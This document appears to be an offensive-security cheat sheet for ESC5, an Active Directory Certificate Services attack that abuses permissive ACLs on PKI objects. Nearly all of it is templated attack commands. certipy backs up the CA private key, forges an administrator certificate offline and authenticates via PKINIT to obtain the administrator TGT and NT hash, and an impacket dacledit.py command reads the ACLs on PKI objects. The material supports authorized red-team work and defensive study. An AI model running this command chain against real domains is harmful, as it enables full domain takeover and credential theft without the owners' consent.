---
technique: ESC5 - PKI Object ACL Abuse
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc5 certificate-services pkinit
---

# ESC5 - PKI Object ACL Abuse

ESC5 abuses permissive ACLs over PKI objects such as NTAuthCertificates, CA objects, or CA host objects to take over trust paths.

## Linux

### ESC5: Step 1: backup CA key after PKI object takeover (certipy)

#certipy #object-acl #ca-backup

Abuse ACL misconfigurations on PKI objects to gain CA control, then back up the private key.

```sh title:"ESC5: backup CA key after gaining PKI object control"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -backup
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC5: Step 2: forge golden certificate (certipy)

#certipy #forge #san #offline

Forge a certificate offline using the stolen CA PFX to impersonate administrator.

```sh title:"ESC5: forge cert with stolen CA key"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -subject "$target_subject" -out administrator.pfx
```
<!-- cheat
import domain_ip
var ca_pfx
var target_subject
-->

### ESC5: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the forged cert to get the administrator TGT and NT hash.

```sh title:"ESC5: PKINIT with forged administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### dacledit.py: read PKI object ACEs (ESC5)

#impacket #dacl #pki-objects

Read DACL on PKI-related AD objects to find permissive ACEs that enable ESC5 escalation paths.

```sh title:"ESC5: read DACL on PKI AD objects to find permissive ACEs"
dacledit.py -action 'read' -principal "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->
